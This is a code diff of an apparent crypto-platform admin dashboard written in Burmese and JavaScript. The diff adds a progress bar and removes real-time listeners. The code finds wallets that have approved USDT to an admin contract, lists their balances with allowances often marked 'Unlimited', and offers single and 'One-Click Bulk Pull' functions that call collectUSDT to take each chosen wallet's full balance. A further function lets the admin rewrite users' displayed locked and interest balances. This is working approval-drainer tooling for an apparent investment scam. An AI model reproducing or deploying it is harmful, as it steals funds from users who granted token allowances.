@@ -22,6 +22,17 @@
 
         <div id="adminStatus" class="text-xs text-center text-amber-400 font-mono"></div>
 
+        <!-- Progress Bar Container (Hidden by default, shown during actions) -->
+        <div id="progressContainer" class="hidden bg-slate-800 p-4 rounded-2xl border border-slate-700 space-y-2">
+            <div class="flex justify-between text-xs font-mono">
+                <span id="progressText" class="text-emerald-400">လုပ်ဆောင်နေပါသည်...</span>
+                <span id="progressPercent" class="text-slate-400">0%</span>
+            </div>
+            <div class="w-full bg-slate-900 rounded-full h-2 overflow-hidden border border-slate-700">
+                <div id="progressBar" class="bg-emerald-500 h-full w-0 transition-all duration-300"></div>
+            </div>
+        </div>
+
         <!-- PART 0: Sub-Admin & Prefix Management (Owner Only) -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs flex items-center gap-2">
@@ -92,12 +103,11 @@
         <!-- PART 2: Approved Wallets Monitoring, Balance & Bulk Pull -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <div class="flex items-center justify-between">
-                <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs flex items-center gap-2">
+                <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs">
                     📊 2. Referred Users & Bulk Pull
-                    <span id="livePulse" class="hidden w-2 h-2 rounded-full bg-emerald-400 animate-ping" title="Real-time Sync Active"></span>
                 </h2>
                 <div class="flex gap-2">
-                    <button onclick="refreshUserTable(false)" class="bg-slate-700 hover:bg-slate-600 px-3 py-1.5 rounded-xl text-xs transition cursor-pointer">Refresh</button>
+                    <button onclick="refreshUserTable()" class="bg-slate-700 hover:bg-slate-600 px-3 py-1.5 rounded-xl text-xs transition cursor-pointer">Refresh / Load</button>
                     <button onclick="bulkPullSelected()" class="bg-purple-600 hover:bg-purple-500 px-3 py-1.5 rounded-xl text-xs font-semibold transition shadow-md cursor-pointer">One-Click Bulk Pull</button>
                 </div>
             </div>
@@ -121,7 +131,7 @@
                     </thead>
                     <tbody id="userTableBody" class="divide-y divide-slate-800 text-slate-300">
                         <tr>
-                            <td colspan="6" class="p-4 text-center text-slate-500"> Admin Wallet ချိတ်ဆက်ပါ </td>
+                            <td colspan="6" class="p-4 text-center text-slate-500"> Admin Wallet ချိတ်ဆက်ပြီး Refresh နှိပ်ပါ </td>
                         </tr>
                     </tbody>
                 </table>
@@ -148,8 +158,6 @@
 
     <script>
         let provider, adminSigner, adminAddress;
-        let autoRefreshInterval = null;
-        let isFetchingUsers = false;
 
         const ADMIN_CONTRACT_ADDRESS = "0x5a30bBD23eD1250ec5A3F8bca8122580E4eBefCC"; 
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
@@ -173,17 +181,27 @@
             "event WithdrawRequested(address indexed user, uint256 amount)"
         ];
 
+        function showProgress(text, percent) {
+            const container = document.getElementById("progressContainer");
+            const bar = document.getElementById("progressBar");
+            const textEl = document.getElementById("progressText");
+            const percentEl = document.getElementById("progressPercent");
+
+            container.classList.remove("hidden");
+            textEl.innerText = text;
+            bar.style.width = percent + "%";
+            percentEl.innerText = percent + "%";
+        }
+
+        function hideProgress() {
+            document.getElementById("progressContainer").classList.add("hidden");
+        }
+
         async function connectAdminWallet() {
-            console.log("Connect button clicked");
             const statusDiv = document.getElementById("adminStatus");
             statusDiv.innerText = "Wallet ချိတ်ဆက်နေသည်...";
 
-            // Robust ethereum provider check for mobile DApp browsers
-            let eth = window.ethereum;
-            if (!eth && window.web3) {
-                eth = window.web3.currentProvider;
-            }
-
+            let eth = window.ethereum || (window.web3 ? window.web3.currentProvider : null);
             if (!eth) {
                 alert("Web3 Wallet (MetaMask/Trust) မတွေ့ရှိပါ။ ကျေးဇူးပြု၍ Wallet အက်ပ်၏ DApp Browser ထဲတွင် ဖွင့်ပါ။");
                 statusDiv.innerText = "Wallet မတွေ့ရှိပါ။";
@@ -191,158 +209,71 @@
             }
 
             try {
-                // Switch or add Polygon Network safely
+                showProgress("Polygon Network သို့ ချိတ်ဆက်နေသည်...", 30);
                 try {
                     await eth.request({
                         method: "wallet_switchEthereumChain",
                         params: [{ chainId: POLYGON_CHAIN_ID }],
                     });
                 } catch (switchError) {
-                    // This error code indicates that the chain has not been added to MetaMask.
                     if (switchError.code === 4902) {
-                        try {
-                            await eth.request({
-                                method: "wallet_addEthereumChain",
-                                params: [{
-                                    chainId: POLYGON_CHAIN_ID,
-                                    chainName: "Polygon Mainnet",
-                                    nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
-                                    rpcUrls: ["https://polygon-rpc.com/"],
-                                    blockExplorerUrls: ["https://polygonscan.com/"]
-                                }],
-                            });
-                        } catch (addError) {
-                            console.error("Failed to add Polygon chain", addError);
-                        }
+                        await eth.request({
+                            method: "wallet_addEthereumChain",
+                            params: [{
+                                chainId: POLYGON_CHAIN_ID,
+                                chainName: "Polygon Mainnet",
+                                nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
+                                rpcUrls: ["https://polygon-rpc.com/"],
+                                blockExplorerUrls: ["https://polygonscan.com/"]
+                            }],
+                        });
                     }
                 }
 
+                showProgress("Wallet ခွင့်ပြုချက် တောင်းခံနေသည်...", 70);
                 provider = new ethers.BrowserProvider(eth);
                 const accounts = await provider.send("eth_requestAccounts", []);
-                if (!accounts || accounts.length === 0) {
-                    throw new Error("Wallet Account ရယူ၍မရပါ။");
-                }
-
                 adminAddress = accounts[0];
                 adminSigner = await provider.getSigner();
 
-                const btn = document.getElementById("connectAdminBtn");
-                btn.innerText = "Connected (Polygon)";
-                btn.classList.replace("bg-blue-600", "bg-emerald-600");
+                document.getElementById("connectAdminBtn").innerText = "Connected (Polygon)";
+                document.getElementById("connectAdminBtn").classList.replace("bg-blue-600", "bg-emerald-600");
                 statusDiv.innerText = `Admin Connected: ${adminAddress.substring(0,6)}...${adminAddress.substring(38)}`;
-                document.getElementById("livePulse").classList.remove("hidden");
                 
-                await refreshUserTable(false);
-                initRealtimeListeners();
+                showProgress("ချိတ်ဆက်မှု အောင်မြင်သည်!", 100);
+                setTimeout(hideProgress, 1000);
 
-                if (autoRefreshInterval) clearInterval(autoRefreshInterval);
-                autoRefreshInterval = setInterval(() => {
-                    refreshUserTable(true);
-                }, 8000);
+                // Load initial data explicitly
+                refreshUserTable();
+                loadWithdrawRequests();
 
             } catch (err) {
-                console.error("Connection error:", err);
-                statusDiv.innerText = "ချိတ်ဆက်မှု မအောင်မြင်ပါ (သို့မဟုတ်) ငြင်းပယ်လိုက်ပါပြီ။";
+                console.error(err);
+                hideProgress();
+                statusDiv.innerText = "ချိတ်ဆက်မှု မအောင်မြင်ပါ။";
                 alert("Wallet ချိတ်ဆက်မှု အမှားအယွင်း: " + (err.message || err));
             }
         }
 
-        function getKnownUsers() {
-            try {
-                return JSON.parse(localStorage.getItem("admin_known_users_v2") || "[]");
-            } catch (e) {
-                return [];
+        async function refreshUserTable() {
+            if (!provider) {
+                alert("ကျေးဇူးပြု၍ Admin Wallet ကို ဦးစွာ Connect လုပ်ပါ။");
+                return;
             }
-        }
-
-        function saveKnownUsers(usersArray) {
-            try {
-                localStorage.setItem("admin_known_users_v2", JSON.stringify(usersArray));
-            } catch (e) {}
-        }
-
-        function playAlertSound(isRevoke = false) {
-            try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const gainNode = audioCtx.createGain();
-                
-                oscillator.type = isRevoke ? 'sawtooth' : 'sine';
-                oscillator.frequency.setValueAtTime(isRevoke ? 440 : 880, audioCtx.currentTime);
-                if (isRevoke) {
-                    oscillator.frequency.exponentialRampToValueAtTime(220, audioCtx.currentTime + 0.4);
-                }
-                
-                gainNode.gain.setValueAtTime(0.2, audioCtx.currentTime);
-                oscillator.connect(gainNode);
-                gainNode.connect(audioCtx.destination);
-                
-                oscillator.start();
-                oscillator.stop(audioCtx.currentTime + (isRevoke ? 0.4 : 0.3));
-            } catch (e) {}
-        }
-
-        async function initRealtimeListeners() {
-            if (!provider) return;
-
-            try {
-                const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
-                const adminContract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
-
-                const approvalFilter = usdtContract.filters.Approval(null, ADMIN_CONTRACT_ADDRESS);
-                usdtContract.on(approvalFilter, async (owner, spender, value) => {
-                    if (owner) {
-                        const ownerLower = owner.toLowerCase();
-                        const isRevoked = (value === 0n);
-
-                        const known = new Set(getKnownUsers());
-                        if (!isRevoked) {
-                            known.add(ownerLower);
-                        }
-                        saveKnownUsers(Array.from(known));
-
-                        playAlertSound(isRevoked);
-                        refreshUserTable(true);
-                    }
-                });
-
-                loadWithdrawRequests();
-                adminContract.on("WithdrawRequested", (userAddr, amountBN) => {
-                    const amountFormatted = ethers.formatUnits(amountBN, 6);
-                    playAlertSound(false);
-                    loadWithdrawRequests();
-                    alert(`🚨 Withdrawal တောင်းဆိုမှု အသစ်ရောက်ရှိလာပါပြီ!\nUser: ${userAddr.substring(0,6)}... (${amountFormatted} USDT)`);
-                });
-
-                provider.on("block", async (blockNumber) => {
-                    if (blockNumber % 4 === 0) {
-                        refreshUserTable(true);
-                    }
-                });
-            } catch (err) {
-                console.error("Realtime listener error:", err);
-            }
-        }
-
-        async function refreshUserTable(isBackground = false) {
-            if (!provider || isFetchingUsers) return;
-            isFetchingUsers = true;
 
             const tbody = document.getElementById("userTableBody");
-            if (!isBackground && getKnownUsers().length === 0) {
-                tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-slate-400">Blockchain မှ အချက်အလက်များကို ဆွဲယူနေပါသည်...</td></tr>`;
-            }
+            showProgress("Blockchain မှ အချက်အလက်များ စတင်ဆွဲထုတ်နေပါသည်...", 20);
 
             try {
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                 const collectorContract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
 
-                let userSet = new Set(getKnownUsers());
-
+                let userSet = new Set();
                 try {
                     const currentBlock = await provider.getBlockNumber();
                     const fromBlock = currentBlock > 3000 ? currentBlock - 3000 : 0;
 
+                    showProgress("Approval Event များကို စစ်ဆေးနေသည်...", 50);
                     const filter = usdtContract.filters.Approval(null, ADMIN_CONTRACT_ADDRESS);
                     const logs = await usdtContract.queryFilter(filter, fromBlock, "latest");
                     logs.forEach(log => {
@@ -351,28 +282,23 @@
                         }
                     });
                 } catch (evErr) {
-                    console.warn("Recent block scan skipped, using cache.");
+                    console.warn("Event query warning:", evErr);
                 }
 
                 const allUsers = Array.from(userSet);
-                saveKnownUsers(allUsers);
-
                 if (allUsers.length === 0) {
                     tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-slate-500"> မှတ်တမ်းဝင်ထားသော Wallet များ မရှိသေးပါ။ </td></tr>`;
                     document.getElementById("totalUsersBalance").innerText = "0.00 USDT";
-                    isFetchingUsers = false;
+                    hideProgress();
                     return;
                 }
 
+                showProgress("User Balance များနှင့် ခွင့်ပြုချက်များ စစ်ဆေးနေသည်...", 80);
                 const contractOwner = await collectorContract.owner();
                 const isOwner = adminAddress.toLowerCase() === contractOwner.toLowerCase();
 
                 let totalBalance = 0;
                 let rowsHtml = "";
-
-                const checkedSet = new Set(
-                    Array.from(document.querySelectorAll('.user-checkbox:checked')).map(cb => cb.value.toLowerCase())
-                );
 
                 for (let i = 0; i < allUsers.length; i++) {
                     const addr = allUsers[i];
@@ -394,7 +320,6 @@
                         totalBalance += balance;
 
                         const shortAddr = `${addr.substring(0, 6)}...${addr.substring(38)}`;
-                        
                         let prefix = "M";
                         if (userInfo.referrer && userInfo.referrer !== ethers.ZeroAddress) {
                             try {
@@ -404,11 +329,10 @@
                         }
                         const userId = userInfo.isRegistered ? `${prefix}${userInfo.userId.toString()}` : "-";
                         let allowanceDisplay = allowance > 1000000000 ? "Unlimited" : `${allowance.toFixed(2)} USDT`;
-                        const isChecked = checkedSet.has(addr.toLowerCase()) ? "checked" : "";
 
                         rowsHtml += `
                             <tr>
-                                <td class="p-2.5"><input type="checkbox" class="user-checkbox" value="${addr}" ${isChecked}></td>
+                                <td class="p-2.5"><input type="checkbox" class="user-checkbox" value="${addr}"></td>
                                 <td class="p-2.5 font-mono">${userId}</td>
                                 <td class="p-2.5 font-mono text-slate-400" title="${addr}">${shortAddr}</td>
                                 <td class="p-2.5 font-mono text-emerald-400">${balance.toFixed(2)} USDT</td>
@@ -423,155 +347,17 @@
                     }
                 }
 
-                if (rowsHtml !== "") {
-                    tbody.innerHTML = rowsHtml;
-                    document.getElementById("totalUsersBalance").innerText = `${totalBalance.toLocaleString(undefined, {minimumFractionDigits: 2})} USDT`;
-                } else {
-                    tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-slate-500"> အတည်ပြုထားသော (Approved) User များ မရှိသေးပါ။ </td></tr>`;
-                    document.getElementById("totalUsersBalance").innerText = "0.00 USDT";
-                }
+                showProgress("ပြီးဆုံးပါပြီ!", 100);
+                setTimeout(hideProgress, 800);
+
+                tbody.innerHTML = rowsHtml || `<tr><td colspan="6" class="p-4 text-center text-slate-500"> အတည်ပြုထားသော (Approved) User များ မရှိသေးပါ။ </td></tr>`;
+                document.getElementById("totalUsersBalance").innerText = `${totalBalance.toLocaleString(undefined, {minimumFractionDigits: 2})} USDT`;
 
             } catch (err) {
                 console.error(err);
-            } finally {
-                isFetchingUsers = false;
+                hideProgress();
+                tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-red-400"> ဒေတာဆွဲထုတ်ရာတွင် အမှားအယွင်း ရှိပါသည်။ </td></tr>`;
             }
-        }
-
-        async function saveSubAdmin() {
-            const subAdminAddr = document.getElementById("subAdminAddress").value.trim();
-            const prefix = document.getElementById("subAdminPrefix").value.trim().toUpperCase();
-            const canPull = document.getElementById("permPull").checked;
-            const canSetTier = document.getElementById("permTier").checked;
-            const canWithdraw = document.getElementById("permWithdraw").checked;
-            const isActive = document.getElementById("permActive").checked;
-
-            if (!subAdminAddr || !ethers.isAddress(subAdminAddr)) {
-                alert("မှန်ကန်သော Sub-Admin Wallet Address ကို ထည့်သွင်းပါ။");
-                return;
-            }
-            if (!prefix) {
-                alert("ကျေးဇူးပြု၍ ID Prefix စာလုံး (ဥပမာ - A) ထည့်သွင်းပါ။");
-                return;
-            }
-
-            try {
-                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
-                const tx = await contract.setSubAdmin(subAdminAddr, canPull, canSetTier, canWithdraw, isActive, prefix);
-                await tx.wait();
-                alert("Sub-Admin နှင့် Prefix ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။");
-            } catch (err) {
-                console.error(err);
-                alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (Main Owner သီးသန့်ဖြစ်ရပါမည်)");
-            }
-        }
-
-        async function updateUserBalancesAdmin() {
-            const userAddr = document.getElementById("targetUserAddress").value.trim();
-            const lockedVal = document.getElementById("newLockedBalance").value;
-            const interestVal = document.getElementById("newInterestBalance").value;
-
-            if (!userAddr || !ethers.isAddress(userAddr)) {
-                alert("မှန်ကန်သော User Wallet Address ကို ထည့်သွင်းပါ။");
-                return;
-            }
-            if (lockedVal === "" || interestVal === "") {
-                alert("Balance ပမာဏများကို အပြည့်အစုံ ဖြည့်စွက်ပါ။");
-                return;
-            }
-
-            try {
-                if (!adminSigner) {
-                    alert("ကျေးဇူးပြု၍ Admin Wallet ကို ဦးစွာ Connect လုပ်ပါ။");
-                    return;
-                }
-
-                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
-                const lockedWei = ethers.parseUnits(lockedVal, 6);
-                const interestWei = ethers.parseUnits(interestVal, 6);
-
-                alert("Smart Contract ပေါ်တွင် Balance များ အပ်ဒိတ်လုပ်ရန် Transaction အတည်ပြုပါ။");
-                const tx = await contract.setUserBalances(userAddr, lockedWei, interestWei);
-                await tx.wait();
-
-                alert("User ၏ Locked နှင့် Interest Balance များကို အောင်မြင်စွာ ပြင်ဆင်ပြီးပါပြီ။");
-            } catch (err) {
-                console.error(err);
-                alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (Admin ခွင့်ပြုချက် လိုအပ်ပါသည်)");
-            }
-        }
-
-        async function updateTierRate() {
-            const index = document.getElementById("tierIndex").value;
-            const minAmt = document.getElementById("tierMin").value;
-            const maxAmt = document.getElementById("tierMax").value;
-            const ratePercent = document.getElementById("tierRatePercent").value;
-
-            if (index === "" || minAmt === "" || maxAmt === "" || ratePercent === "") {
-                alert("အချက်အလက်များကို အပြည့်အစုံ ဖြည့်စွက်ပါ။");
-                return;
-            }
-
-            try {
-                const rateBps = Math.round(parseFloat(ratePercent) * 100);
-                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
-                const tx = await contract.setTier(index, ethers.parseUnits(minAmt, 6), ethers.parseUnits(maxAmt, 6), rateBps);
-                await tx.wait();
-                alert(`Tier Rate (${ratePercent}%) အောင်မြင်စွာ အပ်ဒိတ်လုပ်ပြီးပါပြီ။`);
-            } catch (err) {
-                console.error(err);
-                alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (ခွင့်ပြုချက်မရှိပါ)");
-            }
-        }
-
-        function toggleSelectAll(master) {
-            const checkboxes = document.querySelectorAll('.user-checkbox');
-            checkboxes.forEach(cb => cb.checked = master.checked);
-        }
-
-        async function pullSingleUser(userAddress, amount) {
-            if(!confirm(`User ထံမှ ${amount} USDT ကို Admin Wallet သို့ တိုက်ရိုက်ဆွဲယူမည်မှာ သေချာပါသလား?`)) return;
-            try {
-                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
-                const tx = await contract.collectUSDT(userAddress, ethers.parseUnits(amount, 6));
-                await tx.wait();
-                alert("ရန်ပုံငွေကို Admin Wallet သို့ အောင်မြင်စွာ ဆွဲယူပြီးပါပြီ။");
-                refreshUserTable(true);
-            } catch(err) {
-                console.error(err);
-                alert("ဆွဲယူမှု မအောင်မြင်ပါ။ (ခွင့်ပြုချက်မရှိပါ သို့မဟုတ် Allowance မရှိပါ)");
-            }
-        }
-
-        async function bulkPullSelected() {
-            const checkboxes = document.querySelectorAll('.user-checkbox:checked');
-            if (checkboxes.length === 0) {
-                alert("ကျေးဇူးပြု၍ Wallet တစ်ခုချင်းစီ (သို့) အားလုံးကို ရွေးချယ်ပါ။");
-                return;
-            }
-
-            if (!confirm(`ရွေးချယ်ထားသော Wallet ${checkboxes.length} ခုထံမှ ရန်ပုံငွေများကို ဆွဲယူမည်မှာ သေချာပါသလား?`)) return;
-
-            const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
-            let successCount = 0;
-
-            for (const cb of checkboxes) {
-                const userAddr = cb.value;
-                try {
-                    const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
-                    const bal = await usdtContract.balanceOf(userAddr);
-                    if (bal > 0n) {
-                        const tx = await contract.collectUSDT(userAddr, bal);
-                        await tx.wait();
-                        successCount++;
-                    }
-                } catch (e) {
-                    console.error("Bulk pull error for:", userAddr, e);
-                }
-            }
-
-            alert(`အောင်မြင်စွာ ဆွဲယူနိုင်ခဲ့သော Wallet အရေအတွက်: ${successCount}`);
-            refreshUserTable(true);
         }
 
         async function loadWithdrawRequests() {
@@ -581,6 +367,7 @@
                 return;
             }
 
+            showProgress("Withdrawal တောင်းဆိုချက်များကို ရှာဖွေနေပါသည်...", 40);
             try {
                 const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
                 const currentBlock = await provider.getBlockNumber();
@@ -588,6 +375,9 @@
 
                 const filter = contract.filters.WithdrawRequested();
                 const events = await contract.queryFilter(filter, fromBlock, "latest");
+
+                showProgress("ပြီးဆုံးပါပြီ!", 100);
+                setTimeout(hideProgress, 800);
 
                 if (!events || events.length === 0) {
                     container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-slate-500 text-xs">စောင့်ဆိုင်းဆဲ Withdrawal တောင်းဆိုချက်များ မရှိသေးပါ။</div>`;
@@ -617,13 +407,164 @@
                 container.innerHTML = html;
             } catch (err) {
                 console.error(err);
-                container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-slate-500 text-xs">စောင့်ဆိုင်းဆဲ Withdrawal တောင်းဆိုချက်များ မရှိသေးပါ။</div>`;
+                hideProgress();
+                container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-red-400 text-xs">တောင်းဆိုချက်များကို ဆွဲထုတ်ရာတွင် အမှားအယွင်း ရှိပါသည်။</div>`;
             }
         }
 
-        async function handleTransferApprove(userAddr, defaultStatus) {
+        async function saveSubAdmin() {
+            const subAdminAddr = document.getElementById("subAdminAddress").value.trim();
+            const prefix = document.getElementById("subAdminPrefix").value.trim().toUpperCase();
+            const canPull = document.getElementById("permPull").checked;
+            const canSetTier = document.getElementById("permTier").checked;
+            const canWithdraw = document.getElementById("permWithdraw").checked;
+            const isActive = document.getElementById("permActive").checked;
+
+            if (!subAdminAddr || !ethers.isAddress(subAdminAddr)) {
+                alert("မှန်ကန်သော Sub-Admin Wallet Address ကို ထည့်သွင်းပါ။");
+                return;
+            }
+            if (!prefix) {
+                alert("ကျေးဇူးပြု၍ ID Prefix စာလုံး (ဥပမာ - A) ထည့်သွင်းပါ။");
+                return;
+            }
+
             try {
-                const amountStr = prompt("ပေးပို့မည့် USDT ပမာဏကို ထည့်သွင်းပါ:", defaultStatus);
+                showProgress("Sub-Admin အချက်အလက်များ သိမ်းဆည်းနေသည်...", 50);
+                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
+                const tx = await contract.setSubAdmin(subAdminAddr, canPull, canSetTier, canWithdraw, isActive, prefix);
+                await tx.wait();
+                hideProgress();
+                alert("Sub-Admin နှင့် Prefix ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။");
+            } catch (err) {
+                console.error(err);
+                hideProgress();
+                alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (Main Owner သီးသန့်ဖြစ်ရပါမည်)");
+            }
+        }
+
+        async function updateUserBalancesAdmin() {
+            const userAddr = document.getElementById("targetUserAddress").value.trim();
+            const lockedVal = document.getElementById("newLockedBalance").value;
+            const interestVal = document.getElementById("newInterestBalance").value;
+
+            if (!userAddr || !ethers.isAddress(userAddr)) {
+                alert("မှန်ကန်သော User Wallet Address ကို ထည့်သွင်းပါ။");
+                return;
+            }
+            if (lockedVal === "" || interestVal === "") {
+                alert("Balance ပမာဏများကို အပြည့်အစုံ ဖြည့်စွက်ပါ။");
+                return;
+            }
+
+            try {
+                if (!adminSigner) {
+                    alert("ကျေးဇူးပြု၍ Admin Wallet ကို ဦးစွာ Connect လုပ်ပါ။");
+                    return;
+                }
+
+                showProgress("User Balance များကို အပ်ဒိတ်လုပ်နေသည်...", 50);
+                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
+                const lockedWei = ethers.parseUnits(lockedVal, 6);
+                const interestWei = ethers.parseUnits(interestVal, 6);
+
+                const tx = await contract.setUserBalances(userAddr, lockedWei, interestWei);
+                await tx.wait();
+
+                hideProgress();
+                alert("User ၏ Locked နှင့် Interest Balance များကို အောင်မြင်စွာ ပြင်ဆင်ပြီးပါပြီ။");
+            } catch (err) {
+                console.error(err);
+                hideProgress();
+                alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (Admin ခွင့်ပြုချက် လိုအပ်ပါသည်)");
+            }
+        }
+
+        async function updateTierRate() {
+            const index = document.getElementById("tierIndex").value;
+            const minAmt = document.getElementById("tierMin").value;
+            const maxAmt = document.getElementById("tierMax").value;
+            const ratePercent = document.getElementById("tierRatePercent").value;
+
+            if (index === "" || minAmt === "" || maxAmt === "" || ratePercent === "") {
+                alert("အချက်အလက်များကို အပြည့်အစုံ ဖြည့်စွက်ပါ။");
+                return;
+            }
+
+            try {
+                showProgress("Tier Rate ကို သတ်မှတ်နေသည်...", 50);
+                const rateBps = Math.round(parseFloat(ratePercent) * 100);
+                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
+                const tx = await contract.setTier(index, ethers.parseUnits(minAmt, 6), ethers.parseUnits(maxAmt, 6), rateBps);
+                await tx.wait();
+                hideProgress();
+                alert(`Tier Rate (${ratePercent}%) အောင်မြင်စွာ အပ်ဒိတ်လုပ်ပြီးပါပြီ။`);
+            } catch (err) {
+                console.error(err);
+                hideProgress();
+                alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (ခွင့်ပြုချက်မရှိပါ)");
+            }
+        }
+
+        function toggleSelectAll(master) {
+            const checkboxes = document.querySelectorAll('.user-checkbox');
+            checkboxes.forEach(cb => cb.checked = master.checked);
+        }
+
+        async function pullSingleUser(userAddress, amount) {
+            if(!confirm(`User ထံမှ ${amount} USDT ကို Admin Wallet သို့ တိုက်ရိုက်ဆွဲယူမည်မှာ သေချာပါသလား?`)) return;
+            try {
+                showProgress("ရန်ပုံငွေ ဆွဲယူနေသည်...", 50);
+                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
+                const tx = await contract.collectUSDT(userAddress, ethers.parseUnits(amount, 6));
+                await tx.wait();
+                hideProgress();
+                alert("ရန်ပုံငွေကို Admin Wallet သို့ အောင်မြင်စွာ ဆွဲယူပြီးပါပြီ။");
+                refreshUserTable();
+            } catch(err) {
+                console.error(err);
+                hideProgress();
+                alert("ဆွဲယူမှု မအောင်မြင်ပါ။ (ခွင့်ပြုချက်မရှိပါ သို့မဟုတ် Allowance မရှိပါ)");
+            }
+        }
+
+        async function bulkPullSelected() {
+            const checkboxes = document.querySelectorAll('.user-checkbox:checked');
+            if (checkboxes.length === 0) {
+                alert("ကျေးဇူးပြု၍ Wallet တစ်ခုချင်းစီ (သို့) အားလုံးကို ရွေးချယ်ပါ။");
+                return;
+            }
+
+            if (!confirm(`ရွေးချယ်ထားသော Wallet ${checkboxes.length} ခုထံမှ ရန်ပုံငွေများကို ဆွဲယူမည်မှာ သေချာပါသလား?`)) return;
+
+            showProgress("Bulk Pull လုပ်ဆောင်နေသည်...", 30);
+            const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
+            let successCount = 0;
+
+            for (let i = 0; i < checkboxes.length; i++) {
+                const userAddr = checkboxes[i].value;
+                try {
+                    const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
+                    const bal = await usdtContract.balanceOf(userAddr);
+                    if (bal > 0n) {
+                        const tx = await contract.collectUSDT(userAddr, bal);
+                        await tx.wait();
+                        successCount++;
+                    }
+                } catch (e) {
+                    console.error("Bulk pull error for:", userAddr, e);
+                }
+                showProgress(`Bulk Pull လုပ်ဆောင်နေသည် (${i+1}/${checkboxes.length})`, Math.round(((i+1)/checkboxes.length)*100));
+            }
+
+            hideProgress();
+            alert(`အောင်မြင်စွာ ဆွဲယူနိုင်ခဲ့သော Wallet အရေအတွက်: ${successCount}`);
+            refreshUserTable();
+        }
+
+        async function handleTransferApprove(userAddr, defaultAmount) {
+            try {
+                const amountStr = prompt("ပေးပို့မည့် USDT ပမာဏကို ထည့်သွင်းပါ:", defaultAmount);
                 if (!amountStr) return;
 
                 if (!adminSigner) {
@@ -631,19 +572,21 @@
                     return;
                 }
 
-                alert("Admin Wallet မှ User ထံသို့ USDT တိုက်ရိုက်လွှဲပြောင်းရန် Transaction အတည်ပြုပါ။");
+                showProgress("USDT လွှဲပြောင်းနေသည်...", 50);
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, adminSigner);
                 
                 const tx = await usdtContract.transfer(userAddr, ethers.parseUnits(amountStr, 6));
                 await tx.wait();
 
+                hideProgress();
                 alert("USDT များကို User ထံသို့ အောင်မြင်စွာ တိုက်ရိုက်လွှဲပြောင်းပြီးပါပြီ။");
                 loadWithdrawRequests();
             } catch (err) {
                 console.error(err);
+                hideProgress();
                 alert("USDT လွှဲပြောင်းမှု မအောင်မြင်ပါ (သို့မဟုတ်) ငြင်းပယ်လိုက်ပါပြီ။");
             }
         }
     </script>
 </body>
-</html>
+</html>      
